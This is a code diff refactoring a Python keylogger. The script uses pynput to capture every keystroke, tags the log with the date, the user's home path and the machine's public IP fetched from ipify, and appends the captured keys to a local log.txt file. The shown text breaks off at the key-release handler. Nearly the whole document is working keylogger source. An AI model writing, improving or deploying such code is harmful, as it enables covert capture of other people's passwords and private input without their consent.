@@ -1,42 +1,42 @@
-import pynput, time, os, random, requests, socket, pyxhook
+import os
+import requests
+import socket
+import time
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
+
+class KeyLogVar:
+    counter = 0
+    key_logs = []
+
 
 date_time = time.ctime(time.time())
 user = os.path.expanduser('~').split(socket.gethostname())
 pubIP = requests.get('https://api.ipify.org').text
 
-Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} \n'
-key_logs = []
-key_logs.append(Log_Title)
+Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} '
+KeyLogVar.key_logs.append(Log_Title)
+
 
 def key_input(key):
-    global keys, count
-    key_substitution = ['Key.enter', '[ENTER]', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
-                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
-                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]']
+    key_substitution = ['Key.enter', '(ENTER)', 'Key.backspace', '(BACKSPACE)', 'Key.space', ' ',
+                        'Key.alt_l', '(ALT)', 'Key.tab', '(TAB)', 'Key.delete', '(DEL)', 'Key.ctrl_l', '(CTRL)',
+                        'Key.left', '(LEFT ARROW)', 'Key.right', '(RIGHT ARROW)', 'Key.shift', '(SHIFT)', 'Key.up',
+                        '(UP ARROW)', 'Key.down', '(DOWN ARROW)']
     key = str(key).replace("'", "")
     if key in key_substitution:
-        keys.append(key_substitution[key_substitution.index(key)+1])
-        print("Passed1")
-        count += 1
+        KeyLogVar.key_logs.append(key_substitution[key_substitution.index(key) + 1])
     else:
-        keys.append(key)
-        print("Passed2")
-        count += 1
-        #  print("{0} pressed".format(key))
-    if count >= 10:
-        count = 0
-        file_wr(keys)
-        keys = []
+        KeyLogVar.key_logs.append(key)
+    file_wr(KeyLogVar.key_logs)
+    KeyLogVar.key_logs = []
 
 
-def file_wr(keys):
+def file_wr(key_logs):
     with open("log.txt", "a") as f:
-        k = str(keys)
+        k = str(key_logs)
         f.write(k)
+
 
 def key_release(key):
     if key == Key.esc:
